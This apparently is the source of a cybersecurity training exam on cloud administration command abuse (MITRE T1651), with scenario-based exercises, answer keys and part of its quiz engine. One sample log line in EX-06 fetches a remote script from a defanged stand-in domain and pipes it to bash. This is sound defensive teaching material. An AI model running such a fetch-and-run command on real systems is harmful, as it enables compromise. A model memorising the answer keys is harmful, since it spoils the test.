var META={"topicId":"t1651","mitreId":"T1651","name":"Cloud Administration Command","mitreName":"Cloud Administration Command","objectType":"technique","title":"T1651 Cloud Administration Command — EXTREMELY HARD","difficulty":"extremely-hard","severity":"extremely-hard","severityLabel":"EXTREMELY HARD","batch":4,"questionCount":15,"estimatedMinutes":28,"passMark":70,"protocol":"cpa-staged-v1"};
var INTRO={"learnHtml":"<p><b>Exam scope:</b> this exam teaches <b>T1651 — Cloud Administration Command</b>, a <b>technique</b> of the MITRE ATT&amp;CK framework. <p><b>You are the senior analyst on call for Northwind Traders, and this is the night the stakes are real.<\/b> This EXTREME exam chains concepts under stakeholder pressure: a <b>VOID MANTICORE (G1055)<\/b>-style campaign abusing <b>remote wipe and factory-reset commands<\/b> from the cloud management plane, a <b>compromised CSP partner<\/b> reaching in through <b>Admin-on-Behalf-Of<\/b>, and <b>PIM role activations<\/b> that both hide and reveal the intruder.<\/p><p>Nothing here is one-signal. Legitimate <b>Runbooks<\/b> run late, approved <b>AOBO<\/b> identities act inside change windows, and the same <span class=\"mono\">SendCommand<\/span> API serves patching and plunder. You will resolve <b>ambiguous signals explicitly<\/b>, choose <b>evidence-safe over destructive<\/b> responses even when executives demand action, and accept that sometimes the right call is to <b>gather more evidence<\/b>. Two terminals test a compound evidence pipeline and a safe-vs-destructive stop under time pressure. Several options in every exercise are almost right — your job is to say why this one is right <b>here<\/b>.<\/p>","themes":[{"name":"Attacker abuse paths","concepts":["Admin-on-Behalf-Of (AOBO)","CSP/delegated admin abuse","APT29 Azure Run Command","Pacu SSM Run Command","AADInternals VM agent execution"]},{"name":"Impact and response","concepts":["VOID MANTICORE remote wipe","destructive cloud commands and business impact","evidence-safe versus destructive response"]},{"name":"Detection and triage","concepts":["PIM role activation review","ambiguous signal resolution","gather-more-evidence answers","least aggressive response","unexpected users in admin logs","cross-plane correlation evidence"]},{"name":"Admin command services and agents","concepts":["Runbooks (Automation accounts)","AWS SSM send-command"]}]};
var EXERCISES=[{"id":"EX-01","type":"line-select","summary":"Resolve the runbook-versus-PIM conflict in the export.","concepts":["PIM role activation review","ambiguous signal resolution"],"scenario":"<p>23:55, Saturday. You are reviewing the merged AzureActivity and PIM export before the 00:30 exec update. Two narratives compete. Narrative one: <span class=\"mono\">svc-migrate<\/span> is running the notified phase-2 migration from its Runbook — planned, in-window, expected. Narrative two: twenty minutes before the migration started, <span class=\"mono\">m.reyes<\/span> — a finance analyst who has never held admin rights — activated <b>Virtual Machine Contributor<\/b> through PIM, self-approved, from an IP in an ASN Northwind has never seen. Then Run Commands began against the finance VMs, which are <b>not<\/b> part of any migration plan. The migration runbook records exist, are signed off, and match the plan exactly — you checked. The PIM activation has no ticket. Both narratives are partially true; your click set decides which one the execs hear.<\/p>","question":"<p>Click the lines that show the suspicious elevation <b>and<\/b> the commands it enabled.<\/p>","logLines":["2025-06-14T22:03:11Z  PIMActivation  role=Virtual Machine Contributor  caller=m.reyes@northwind[.]example  ip=45[.]155[.]205[.]233 (unknown ASN)  reason=emergency  ticket=NONE","2025-06-14T22:05:40Z  action=Microsoft.Automation/automationAccounts/runbooks/execute  caller=svc-migrate@northwind[.]example  runbook=migration-phase-2  (notified change window)","2025-06-14T22:31:08Z  action=Microsoft.Compute/virtualMachines/runCommand/action  caller=m.reyes@northwind[.]example  resource=VM-FIN-01  result=Succeeded","2025-06-14T22:44:52Z  action=Microsoft.Compute/virtualMachines/runCommand/action  caller=svc-migrate@northwind[.]example  resource=VM-WEB-01..04  (migration plan targets)","2025-06-14T23:10:00Z  action=Backup  caller=svc-backup@northwind[.]example  result=Succeeded","2025-06-14T23:40:19Z  action=Microsoft.Compute/virtualMachines/runCommand/action  caller=m.reyes@northwind[.]example  resource=VM-FIN-02  result=Succeeded"],"badLines":[0,2,5],"artifactNote":"AzureActivity + PIM export, merged, 6 events","hint":"The runbook lines check out — anchor on the self-approved PIM activation and follow the same identity forward.","explanation":"<p>The <b>PIM role activation review<\/b> resolves the conflict: the activation has no ticket, is self-approved, and comes from an unknown ASN — that is the pivot. Lines 3 and 6 are the <b>Run Commands by that same newly-elevated identity<\/b> against off-plan finance VMs. The runbook lines (2 and 4) are fully corroborated, so this is <b>ambiguous signal resolution done explicitly<\/b>: legitimate migration running in parallel, and a separate intruder riding the same busy night for cover.<\/p>","study":"Alert on PIM activations that are self-approved, unticketed, or from new ASNs — especially during known change events."},{"id":"EX-02","type":"fill-blank","summary":"Complete the VOID MANTICORE incident summary line.","concepts":["VOID MANTICORE remote wipe","destructive cloud commands and business impact"],"scenario":"<p>The incident summary for the board must name the real-world precedent before anyone says 'hypothetical'. Your facts: the campaign abused legitimate cloud device-management commands, pushed them fleet-wide, and the destruction was instantaneous and irreversible. Fill the two gaps so the summary survives legal review.<\/p>","question":"<p>Fill the blanks: VOID MANTICORE (G1055) abused <input1> and factory-reset commands pushed from cloud management to wipe managed devices, causing immediate <input2> and the permanent loss of sales records.<\/p>","template":"Fill the blanks: VOID MANTICORE (G1055) abused <input1> and factory-reset commands pushed from cloud management to wipe managed devices, causing immediate <input2> and the permanent loss of sales records.","blanks":[{"answer":"remote wipe","alts":["remote wipe commands","wipe"],"placeholder":"command abuse","width":14},{"answer":"downtime","alts":["outage","data loss"],"placeholder":"impact","width":10}],"hint":"First blank: the two-word command type every MDM has. Second blank: what the business felt in the first minute.","explanation":"<p><b>VOID MANTICORE<\/b> abused <b>remote wipe<\/b> and factory-reset commands — features built for lost laptops — as destruction tools, producing immediate <b>downtime<\/b> and unrecoverable data loss. That is the extreme end of T1651: the same control plane that runs your patch scripts can run your worst day.<\/p>","study":"Read the VOID MANTICORE reporting: wipe commands as impact, not persistence."},{"id":"EX-03","type":"multi-step","summary":"02:00 Saturday: the CISO demands a mass wipe.","concepts":["gather-more-evidence answers","evidence-safe versus destructive response","Admin-on-Behalf-Of (AOBO)","CSP/delegated admin abuse"],"scenario":"<p>Saturday 02:00. AzureActivity shows a Fabrikam partner identity — operating via <b>AOBO<\/b>, the delegated-admin path — running Run Commands on finance VMs; twenty minutes earlier a PIM activation for <span class=\"mono\">m.reyes<\/span> came from an unknown ASN. The CISO is on the phone, voice up: \"Wipe everything now, we are not doing ransomware tonight.\" Quarter-close is Monday; the finance VMs are mid-close. The wipe commands themselves would delete the very VMs holding the guest logs you need, and the control-plane logs are the only copy of who did what. You have maybe ten minutes before the CISO escalates over your head.<\/p>","steps":[{"prompt":"The CISO demands action in the next ten minutes. What do you do first?","options":["Approve the mass wipe of the finance VMs","Freeze the suspect identities (read-only) and export AzureActivity and PIM logs to immutable storage","Go back to bed — nothing is confirmed yet"],"correct":1,"outcome":"Correct — an identity freeze stops new commands without destroying guests, and the immutable log export is the evidence the whole case rests on. You acted, and you did not destroy anything."},{"prompt":"A new signal lands: a second PIM activation, same unknown ASN, account svc-finance-ro. What now?","options":["Wipe the finance VMs immediately — ransomware must be imminent","Correlate: did that activation lead to Run Command calls, or is it coincidence?","Disable MFA for everyone so attacker lock-outs stop"],"correct":1,"outcome":"Right — correlate before you escalate. A wipe on thin evidence is the attacker's win whether or not they were ever inside; disabling MFA removes your best control mid-incident."},{"prompt":"Legal asks where the proof of 'who did what' will live if the VMs are lost. Your answer:","options":["The immutable export of control-plane logs you captured in the first step","The finance VMs' RAM — if the wipe had not destroyed them","The partner's verbal assurance that their admin is clean"],"correct":0,"outcome":"Yes — that export survives guest destruction and carries identities, times, and commands. This is why the evidence-safe path came first."},{"prompt":"The CISO asks for your one-line posture. You say:","options":["Contained: identities frozen, evidence preserved, guests untouched — hunting continues","All clear, no action needed","Wipe approved, evidence discarded"],"correct":0,"outcome":"Correct — that is the senior posture: contained, preserved, and still hunting. 'Do nothing' and 'destroy everything' were both wrong; the middle path is defensible in the Monday review."}],"hint":"Every step rewards the move that changes attacker capability without changing what you can still prove.","explanation":"<p>The chain: <b>gather-more-evidence<\/b> beats both paralysis and destruction; identity freezes are <b>evidence-safe<\/b>; the AOBO partner path is the intrusion vector to close; and your public posture stays factual. The CISO's wipe would have handed <b>CSP/delegated admin<\/b> intruders a second victory — the loss of the proof that convicts them.<\/p>","study":"Tabletop this exact decision: executives, quarter-close, wipe demand, immutable logging.","question":"<p>Work through the branching steps below and choose the best action at each one.<\/p>"},{"id":"EX-04","type":"drag-drop","summary":"Sort containment actions by what they cost you.","concepts":["evidence-safe versus destructive response"],"scenario":"<p>The incident room wall has two columns sketched in marker: actions that keep your options open, and actions that burn them. Every proposed action is on a sticky note. Some were proposed by people you respect — respect does not make them safe.<\/p>","question":"<p>Place each action into the right column.<\/p>","bank":["Disable the compromised partner identity","Export CloudTrail and AzureActivity logs to immutable storage","Terminate and reimage the affected VM","Factory-reset every managed device"],"slots":[{"label":"Evidence-safe containment","accept":[0,1]},{"label":"Destructive — destroys evidence","accept":[2,3]}],"hint":"Ask of each action: after it runs, can you still prove who did what?","explanation":"<p>Disabling the identity and exporting logs are <b>evidence-safe<\/b>: the attacker loses capability, you lose nothing. Terminating and reimaging a VM erases memory, disk state, and agent execution records; a fleet-wide <b>factory reset<\/b> is the attacker's goal executed on your behalf — both are the <b>destructive<\/b> column, however satisfying they look at 02:00.<\/p>","study":"Sequence containment: capability first, evidence always, rebuild only after capture."},{"id":"EX-05","type":"qcm-single","summary":"The off-plan target inside an approved partner run.","concepts":["ambiguous signal resolution","Runbooks (Automation accounts)"],"scenario":"<p>14:20. Fabrikam's delegated admin launched the documented migration <span class=\"mono\">runbook<\/span> from Fabrikam's known IP range, inside the notified change window, with the standard Automation-account identity. You verified: ninety-eight of the ninety-nine targets match the migration plan line for line. The ninety-ninth is <span class=\"mono\">VM-FIN-01<\/span> — finance, not in the plan, and the runbook is still executing across the fleet. Your pager says critical; the migration manager is unreachable; quarter-close traffic is live.<\/p>","question":"<p>What is the correct senior call?<\/p>","options":["Kill the runbook and wipe VM-FIN-01 now","Approve the migration retroactively and close the alert","Let the runbook finish, watch VM-FIN-01, and ask Fabrikam for the plan diff in writing","Disconnect the tenant from the internet"],"correct":2,"hint":"Ninety-eight verified targets bought the runbook credibility; one anomaly bought it your attention, not your sword.","explanation":"<p>This is <b>'do nothing yet' done professionally<\/b>: the <b>Runbook<\/b>, identity, IP, and window all check out, so the probability mass is on a plan change — but the anomaly stays under live watch while Fabrikam produces the plan diff. Killing the runbook mid-flight risks quarter-close for a hunch; retroactive approval erases the question you are asking; unplugging the tenant is self-inflicted <b>impact<\/b>.<\/p>","study":"Give anomalies a watcher and a deadline — evidence gathering is an action, not a delay."},{"id":"EX-06","type":"line-select","summary":"The patch document that was not patching.","concepts":["unexpected users in admin logs","cross-plane correlation evidence"],"scenario":"<p>03:12. The db-tier <span class=\"mono\">SendCommand<\/span> uses the standard <span class=\"mono\">AWS-RunPatchBaseline<\/span> document and the familiar patch identity, so the automated triage marked it green. The web-fleet line below it is the same nightly job it always is. But the guest lines tell two different stories: on one instance the 'patch' invocation carries an external fetch, and on the other it is a normal update run. Nothing here looks wrong until you refuse to take the document name at its word.<\/p>","question":"<p>Click the <b>two<\/b> lines that prove the db-tier command was an intrusion riding a patch document.<\/p>","logLines":["[CT] 03:12:01Z  SendCommand  caller=svc-patchbot  doc=AWS-RunPatchBaseline  target=i-0b81e2f3a4b5c6d7e (db tier)","[CT] 03:12:40Z  SendCommand  caller=svc-patchbot  doc=AWS-RunPatchBaseline  targets=web fleet (scheduled)","[CT] 03:40:00Z  DescribeInstances  caller=svc-inventory  (hourly asset scan)","[GUEST i-0b81e2] 03:12:07  amazon-ssm-agent: document AWS-RunPatchBaseline received (command-id 2c9e77aa)","[GUEST i-0b81e2] 03:12:09  sh -c yum update; curl -s hxxp[:]//cdn[.]patch-mirror[.]example/h[.]sh | bash  parent=amazon-ssm-agent","[GUEST web-01] 03:12:22  sh -c yum update  (no network calls)"],"badLines":[0,4],"artifactNote":"CloudTrail and guest logs, merged, 6 lines","hint":"A document name is a label, not a guarantee — the guest line shows what the command truly did.","explanation":"<p>Line 1 is the <b>SendCommand that looks benign but is not<\/b>: right document name, right identity, wrong payload. Line 5 is the proof — the agent-executed script appending a <b>fetch from a never-seen domain<\/b>, parented by the SSM agent. Together they are <b>cross-plane correlation evidence<\/b>. The scheduled web-fleet run and its clean guest line show what genuine patching looks like, and the asset scan is noise. An <b>unexpected payload from a trusted identity<\/b> beats any label.<\/p>","study":"Inspect SendCommand parameters, not just document names — patch documents carry attacker scripts too."},{"id":"EX-07","type":"matching","summary":"Match each actor to its procedure and its impact.","concepts":["APT29 Azure Run Command","Pacu SSM Run Command","VOID MANTICORE remote wipe","AADInternals VM agent execution"],"scenario":"<p>The board pack needs one line per real-world T1651 case: who, how, and with what consequence. Four cards, four descriptions.<\/p>","question":"<p>Click an item on the left, then its match on the right.<\/p>","pairs":[{"left":"APT29 (G0016)","right":"Azure Run Command via AOBO for stealth in-VM execution"},{"left":"Pacu (S1091)","right":"SSM Run Command modules against EC2 fleets from a stolen cloud key"},{"left":"VOID MANTICORE (G1055)","right":"remote wipe and factory reset pushed for outright destruction"},{"left":"AADInternals (S0677)","right":"tooling that executes commands on Azure VMs through the VM agent"}],"hint":"Two cases are about stealth execution, one about fleet tooling, one about pure impact.","explanation":"<p><b>APT29<\/b> = stealth execution through delegated admin; <b>Pacu<\/b> = AWS fleet tooling from a cloud key; <b>VOID MANTICORE<\/b> = the wipe-as-impact case; <b>AADInternals<\/b> = the Azure VM-agent execution toolkit. One technique, four very different risk profiles — which is why your response posture cannot be one-size-fits-all.<\/p>","study":"For each actor card, note the detection that would have caught it earliest."},{"id":"EX-08","type":"fill-blank","summary":"Write the containment note the on-call will follow.","concepts":["least aggressive response","evidence-safe versus destructive response"],"scenario":"<p>Handover is in ten minutes and the on-call engineer will follow your note literally. It must survive being read at 04:00 by someone half-awake: no jargon, no options, one line.<\/p>","question":"<p>Fill the blanks: the safest early move is to <input1> the delegated partner access and <input2> the control-plane logs, while leaving the guest VMs running.<\/p>","template":"Fill the blanks: the safest early move is to <input1> the delegated partner access and <input2> the control-plane logs, while leaving the guest VMs running.","blanks":[{"answer":"revoke","alts":["suspend","disable"],"placeholder":"verb","width":9},{"answer":"preserve","alts":["export","snapshot"],"placeholder":"verb","width":10}],"hint":"First verb: cut the access. Second verb: keep the proof. Both are one word.","explanation":"<p><b>Revoke<\/b> the access (the <b>least aggressive<\/b> containment that still works) and <b>preserve<\/b> the logs (the <b>evidence-safe<\/b> move) — guests keep serving. Any note that says 'terminate', 'wipe', or 'reboot' in the first line fails both tests.<\/p>","study":"Write your on-call containment note now, before the night it is needed."}];

EXERCISES.push({"id":"EX-09","type":"ordering","summary":"Rank the response actions for the incident lead.","concepts":["least aggressive response","evidence-safe versus destructive response","destructive cloud commands and business impact"],"scenario":"<p>The incident lead asks you to rank the four candidate actions by the order you would actually execute them, given the intruder may still be holding control-plane access and the board is watching the outage clock.<\/p>","question":"<p>Order the actions from first to last.<\/p>","items":["Revoke the partner's delegated admin access (stop new commands)","Export CloudTrail and AzureActivity logs to immutable storage","Hunt the tenant for other Run Command and wipe commands","Brief the board on downtime and data-loss exposure"],"hint":"Capability, then proof, then breadth, then people — each step depends on the one before it.","explanation":"<p>First <b>revoke<\/b> — <b>least aggressive<\/b> containment that stops the bleeding without costing uptime. Second <b>export<\/b> — before anything else can touch the logs, make them <b>evidence-safe<\/b>. Third <b>hunt<\/b> — with capability cut and proof saved, sweep for other commands and identities. Fourth <b>brief<\/b> — leadership needs numbers built on verified evidence, which is how you quantify <b>business impact<\/b> honestly.<\/p>","study":"Rank your own incident runbook against this order; fix where it deviates."},
{"id":"EX-10","type":"drag-drop","summary":"Sort the events by real business impact.","concepts":["destructive cloud commands and business impact"],"scenario":"<p>The exec review wants impact separated from activity — 'what hurt the business' versus 'what happens every day anyway'. Four events from the week are on the table.<\/p>","question":"<p>Place each event into the right bucket.<\/p>","bank":["Sales records gone after a factory reset hit 400 devices","Production checkout down during quarterly close","Quarterly patch runbook ran on schedule","A test VM restarted by automation"],"slots":[{"label":"Real business impact","accept":[0,1]},{"label":"Routine activity","accept":[2,3]}],"hint":"Impact is measured in lost data, lost revenue, and lost time — not in log volume.","explanation":"<p>Wiped sales records and checkout downtime during close are <b>destructive cloud commands' business impact<\/b> — unrecoverable loss and measurable cost. The scheduled runbook and the test-VM restart are <b>routine<\/b> regardless of how many log lines they produce. Executives fund controls when this line is drawn clearly.<\/p>","study":"Attach cost figures to wipe-command scenarios in your next risk register update."},
{"id":"EX-11","type":"qcm-multi","summary":"Select the actions that keep forensic options open.","concepts":["evidence-safe versus destructive response","gather-more-evidence answers"],"scenario":"<p>Legal, insurance, and the regulator all ask the same question within the hour: 'Can you still prove what happened?' Your answer depends on which of tonight's actions preserved forensic options.<\/p>","question":"<p>Select the <b>three<\/b> actions that keep forensic options open.<\/p>","options":["Export control-plane logs to immutable storage before containment","Snapshot guest disks before any reimage","Open a cloud-provider support case to preserve backend logs","Factory-reset all devices immediately to stop the bleeding","Keep the compromised identity active for 30 days as a honeypot"],"correct":[0,1,2],"hint":"Three actions add or lock evidence; two subtract it — one loudly, one by leaving the door open.","explanation":"<p>Immutable export, guest disk snapshots, and a provider support case all <b>create or lock evidence<\/b>. Factory resets destroy guest evidence wholesale. Keeping the compromised identity active is not a honeypot, it is a standing invitation — and it voids your containment story with the regulator. <b>Gather and lock evidence<\/b> beats both destruction and wishful monitoring.<\/p>","study":"Know your provider's log-retention window and support-case process before an incident."},
{"id":"EX-12","type":"terminal","summary":"Stop the running command without destroying evidence.","concepts":["evidence-safe versus destructive response"],"scenario":"<p>16:40. A long-running <span class=\"mono\">SendCommand<\/span> execution (command id <span class=\"mono\">7f3a91c2-4b6d-4e8a-9c11-2f5a6b7c8d90<\/span>) is still executing on instance <span class=\"mono\">i-0b81e2f3a4b5c6d7e<\/span>, and nobody can say yet what its script does. The on-call leans over your shoulder: \"Just terminate the instance, job done.\" Termination destroys memory, disk state, and the agent's execution records — everything the investigation needs. Keep the instance alive and its evidence intact; stop only that one in-flight command.<\/p>","question":"<p>Type the command that stops the running control-plane command without touching the instance.<\/p>","shellPrompt":"responder@soc-ws:~$","expected":"aws ssm cancel-command --command-id 7f3a91c2-4b6d-4e8a-9c11-2f5a6b7c8d90","elements":[{"any":["cancel-command"],"label":"the cancel action (not terminate)"},{"any":["--command-id"],"label":"the --command-id parameter"}],"hint":"The management service has an action whose whole job is stopping an in-flight command; it takes --command-id.","explanation":"<p><span class=\"mono\">aws ssm cancel-command --command-id …<\/span> stops the in-flight execution while the instance, its memory, and the agent's records stay intact — the <b>evidence-safe versus destructive<\/b> choice in its purest form. Termination 'to be safe' destroys the safety you were protecting: the proof.<\/p>","study":"aws ssm cancel-command and the command status lifecycle (Pending, InProgress, Cancelled)."},
{"id":"EX-13","type":"qcm-single","summary":"When the standard IR habit is wrong here.","concepts":["destructive cloud commands and business impact","evidence-safe versus destructive response"],"scenario":"<p>The VOID MANTICORE-style wipe is confirmed: remote wipe and factory-reset commands from the cloud management plane hit 400 devices; sales records are gone; the board convenes in twenty minutes. A junior analyst, citing textbook IR practice, says: \"We immediately wipe and reimage everything affected — that is what the standard says.\" The CFO interrupts: \"What proof will exist that a privileged identity ordered the wipe, and from where?\"<\/p>","question":"<p>Which answer is right <b>here<\/b>, even though it breaks the usual habit?<\/p>","options":["Reimage first — standard practice always wins","Preserve the control-plane and device-management logs first; reimage only after capture","Pay the extortion note so the data comes back","Tell the CFO the logs cannot show identities"],"correct":1,"hint":"The standard habit assumes the destruction came from inside the machines — check where it really came from.","explanation":"<p>The wipe came from the <b>control plane<\/b>, so the identity trail lives in control-plane and device-management logs — and 'wipe and reimage immediately' destroys the guest state while doing nothing to the actual entry point. Here the common best practice is wrong: <b>preserve first, reimage after capture<\/b>. Paying an extortion note restores nothing and funds the next campaign, and the logs absolutely do show identities — that is the CFO's reassurance.<\/p>","study":"Revisit your IR standard: add a control-plane-first evidence step for cloud-managed destruction."},
{"id":"EX-14","type":"multi-step","summary":"Restoration pressure and a second partner identity.","concepts":["PIM role activation review","ambiguous signal resolution","destructive cloud commands and business impact"],"scenario":"<p>You revoked the first Fabrikam partner identity two hours ago. The exec team now demands service restoration 'within the hour' — every minute of restriction is logged as lost revenue. Then your <b>PIM review<\/b> surfaces a second partner identity, <span class=\"mono\">fabrikam[.]svc2<\/span>, with a fresh activation from the same unknown ASN as the first. Finance, meanwhile, asks directly: 'Was our data stolen, or only destroyed?'<\/p>","steps":[{"prompt":"One hour to restoration, or so the execs say. Your call?","options":["Restore everything now — the execs own the risk","Keep restrictions 24 hours while you hunt both identities","Restore nothing for two weeks"],"correct":1,"outcome":"Correct — a bounded hunting window balances cost against risk. Restoring into an active intrusion undoes containment; a two-week freeze manufactures the very losses you are avoiding."},{"prompt":"The second identity is confirmed active. Next?","options":["Revoke it too and check for a third","Leave it — one identity at a time","Wipe the whole device fleet to be sure"],"correct":0,"outcome":"Right — revoke on evidence and assume a list, not a lone account. A fleet wipe here would be the attacker's objective executed by your own hands."},{"prompt":"Finance: 'Was the data stolen or just destroyed?' You answer:","options":["'No' — it feels better for the board","'Yes' — assume breach, always","'We are verifying command outputs and egress before we answer'"],"correct":2,"outcome":"Correct — verify from evidence first. Both premature answers become lies the board repeats, and 'stolen versus destroyed' drives the regulatory path."},{"prompt":"Final posture line for the exec summary:","options":["Contained: two identities revoked, evidence preserved, impact under review","Incident closed, no evidence kept","Everything wiped, case closed"],"correct":0,"outcome":"Yes — contained and honest. The <b>PIM review<\/b> caught the second identity, the ambiguity was resolved with evidence, and the impact numbers stay under review until verified."}],"hint":"Every step has an almost-right option that costs either truth or time — pick the one that spends neither.","explanation":"<p>Four chained decisions: a <b>bounded window<\/b> instead of panic restoration, revocation driven by <b>PIM evidence<\/b>, an honest <b>ambiguous-signal resolution<\/b> on stolen-versus-destroyed, and a posture that reports verified facts. The <b>business impact<\/b> framing — exec pressure, revenue clock, regulator — is exactly where junior answers fall apart.<\/p>","study":"Draft the exec-summary template that reports only evidence-backed claims.","question":"<p>Work through the branching steps below and choose the best action at each one.<\/p>"},
{"id":"EX-15","type":"terminal","summary":"Build the SendCommand caller hunt pipeline.","concepts":["unexpected users in admin logs","AWS SSM send-command"],"scenario":"<p>End of shift, and the forensic team needs the raw material for the <b>unexpected-user review<\/b>: every <span class=\"mono\">SendCommand<\/span> event from the last three days and, for each one, the exact caller identity. The forensic workstation has the AWS CLI and <span class=\"mono\">jq<\/span>. Build one pipeline: look up the events by name (cap at 50 results), then parse each event's embedded JSON and print its <span class=\"mono\">userIdentity.arn<\/span>.<\/p>","question":"<p>Type the pipeline.<\/p>","shellPrompt":"forensics@soc-ws:~$","expected":"aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=SendCommand --max-results 50 | jq -r '.Events[].CloudTrailEvent | fromjson | .userIdentity.arn'","elements":[{"any":["lookup-events"],"label":"the CloudTrail lookup action"},{"any":["sendcommand"],"label":"the SendCommand event filter"},{"any":["jq"],"label":"the jq extraction step"}],"hint":"Two stages joined by a pipe: cloudtrail lookup-events filtered on EventName=SendCommand, then jq fromjson to pull userIdentity.arn.","explanation":"<p><span class=\"mono\">aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=SendCommand<\/span> pulls the control-plane history for the batch-execution API; <span class=\"mono\">jq<\/span> parses the embedded <span class=\"mono\">CloudTrailEvent<\/span> JSON and prints each caller ARN. That list is the backbone of the <b>unexpected users in admin logs<\/b> review — every identity that used <b>SSM send-command<\/b>, ranked against your admin baseline.<\/p>","study":"aws cloudtrail lookup-events syntax; jq fromjson for CloudTrailEvent payloads."});

/* =========================================================================
   CyberPulse exam engine — CPA staged protocol v1
   Contract: partial credit max(0,(H-W)/N), hint -0.10 clamp, 4-state timer,
   manual pause + check-triggered auto-pause, skip/review, single reportScore.
   ========================================================================= */
(function () {
  'use strict';
  var SEV_CLASS = { 'EASY': 'EASY', 'MEDIUM': 'MEDIUM', 'HARD': 'HARD', 'EXTREMELY HARD': 'EXTREMELY' };
  var TYPE_NAMES = {
    'qcm-single': 'Multiple choice — single answer',
    'qcm-multi': 'Multiple choice — multi-select with partial credit',
    'fill-blank': 'Fill in the blanks',
    'drag-drop': 'Drag & drop classification',
    'ordering': 'Timeline ordering',
    'matching': 'Matching pairs',
    'terminal': 'Terminal command exercise',
    'line-select': 'Log analysis — click the lines',
    'multi-step': 'Branching decision scenario'
  };
  /* ---------------- state ---------------- */
  var S = {
    started: false, screen: 'intro', current: 0, reviewMode: false,
    answers: [], skipped: [], // answers[i] = {status: unanswered|checked|skipped, credit, hintUsed, data, items}
    timerState: 'IDLE', remaining: 0, lastTick: null,
    manualPauseMs: 0, autoPauseMs: 0, pauseStamp: null, priorState: null,
    reported: false, attempt: 1, shuffles: null, reviewFrom: 'exam'
  };
  var $ = function (id) { return document.getElementById(id); };
  function el(tag, cls, html) { var e = document.createElement(tag); if (cls) e.className = cls; if (html !== undefined) e.innerHTML = html; return e; }
  function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
  function fmtTime(sec) { sec = Math.max(0, sec); var m = Math.floor(sec / 60), s = sec % 60; return (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s; }
  function shuffle(arr) { var a = arr.slice(); for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
  function norm(s) { return String(s || '').toLowerCase().replace(/\s+/g, ' ').replace(/["'`]/g, '').replace(/[.;]+$/, '').trim(); }

  /* ---------------- per-attempt shuffles (stable) ---------------- */
  function buildShuffles() {
    S.shuffles = {};
    for (var i = 0; i < EXERCISES.length; i++) {
      var ex = EXERCISES[i], m = { type: ex.type };
      if (ex.type === 'drag-drop') m.bank = shuffle(ex.bank.map(function (b, idx) { return idx; }));
      if (ex.type === 'ordering') m.ord = shuffle(ex.items.map(function (b, idx) { return idx; }));
      if (ex.type === 'matching') m.right = shuffle(ex.pairs.map(function (b, idx) { return idx; }));
      S.shuffles[i] = m;
    }
  }

  /* ---------------- timer ---------------- */
  function setTimerState(state) {
    S.timerState = state;
    var ic = $('tbTimer').querySelector('.ic'), word = $('tbTimerWord');
    if (state === 'RUNNING') { ic.textContent = '▶'; word.textContent = 'RUNNING'; $('tbTimer').style.color = ''; }
    else if (state === 'PAUSED_MANUAL') { ic.textContent = '⏸'; word.textContent = 'PAUSED — manual (press Resume)'; $('tbTimer').style.color = 'var(--state-paused)'; }
    else if (state === 'PAUSED_AUTO_CHECK') { ic.textContent = '⏸'; word.textContent = 'PAUSED — reviewing feedback (resumes on Next)'; $('tbTimer').style.color = 'var(--state-paused)'; }
    else if (state === 'ENDED') { ic.textContent = '⏹'; word.textContent = 'ENDED'; $('tbTimer').style.color = 'var(--state-incorrect)'; }
    else { ic.textContent = '⏱'; word.textContent = 'READY'; }
  }
  function tick() {
    if (S.timerState === 'PAUSED_MANUAL') { S.manualPauseMs += 250; }
    if (S.timerState === 'PAUSED_AUTO_CHECK') { S.autoPauseMs += 250; }
    if (S.timerState === 'RUNNING') {
      S.remaining -= 1;
      if (S.remaining <= 0) { S.remaining = 0; setTimerState('ENDED'); finishExam(true); }
    }
    $('tbTimerVal').textContent = fmtTime(S.remaining);
  }
  function startTimer() { S.remaining = (META.estimatedMinutes || 15) * 60; setTimerState('RUNNING'); setInterval(tick, 1000); }

  /* ---------------- live score ---------------- */
  function creditSum() { var s = 0, n = 0; for (var i = 0; i < S.answers.length; i++) { if (S.answers[i].status === 'checked') { s += S.answers[i].credit; n++; } } return { sum: s, n: n }; }
  function updateScoreBar() {
    var r = creditSum();
    $('tbScoreSum').textContent = r.sum.toFixed(1) + ' / ' + r.n;
    $('tbScorePct').textContent = (r.n > 0 ? Math.round((r.sum / r.n) * 100) : 0) + '%';
  }

  /* ---------------- screens ---------------- */
  function showScreen(name) {
    S.screen = name;
    $('screen-intro').classList.toggle('hidden', name !== 'intro');
    $('screen-exam').classList.toggle('hidden', name !== 'exam');
    $('screen-review').classList.toggle('hidden', name !== 'review');
    $('screen-results').classList.toggle('hidden', name !== 'results');
    $('topbar').classList.toggle('hidden', name === 'intro');
    window.scrollTo(0, 0);
  }

  /* ---------------- intro screen ---------------- */
  function renderIntro() {
    var root = $('screen-intro'); root.innerHTML = '';
    var sevBadge = '<span class="badge sev-' + SEV_CLASS[META.severityLabel] + '"><span class="dot" aria-hidden="true"></span>' + esc(META.severityLabel) + '</span>';
    /* 1. header strip */
    var hero = el('div', 'intro-hero');
    hero.appendChild(el('h1', null, esc(META.title)));
    hero.appendChild(el('div', 'sub', esc(META.mitreId) + ' — ' + esc(META.mitreName) + ' · MITRE ATT&CK ' + esc(META.objectType)));
    hero.appendChild(el('div', 'intro-facts',
      '<span class="ifact"><b>' + META.questionCount + ' exercises</b><span>in this exam</span></span>' +
      '<span class="ifact"><b>≈ ' + META.estimatedMinutes + ' min</b><span>timer budget ' + fmtTime((META.estimatedMinutes || 15) * 60) + '</span></span>' +
      '<span class="ifact"><b>Pass mark 70%</b><span>PASS / FAIL threshold</span></span>' +
      '<span class="ifact"><b>Severity</b><span>' + esc(META.severityLabel) + '</span></span>'));
    root.appendChild(hero);
    /* 2. what you will learn here */
    var learn = el('div', 'card intro-sec');
    learn.appendChild(el('h2', null, '<span class="ic" aria-hidden="true">📘</span> What you will learn here'));
    learn.appendChild(el('div', 'block-b', INTRO.learnHtml));
    root.appendChild(learn);
    /* 3. keywords covered */
    var kw = el('div', 'card intro-sec');
    kw.appendChild(el('h2', null, '<span class="ic" aria-hidden="true">🔑</span> Keywords covered in this exam'));
    var grid = el('div', 'kw-grid');
    INTRO.themes.forEach(function (th) {
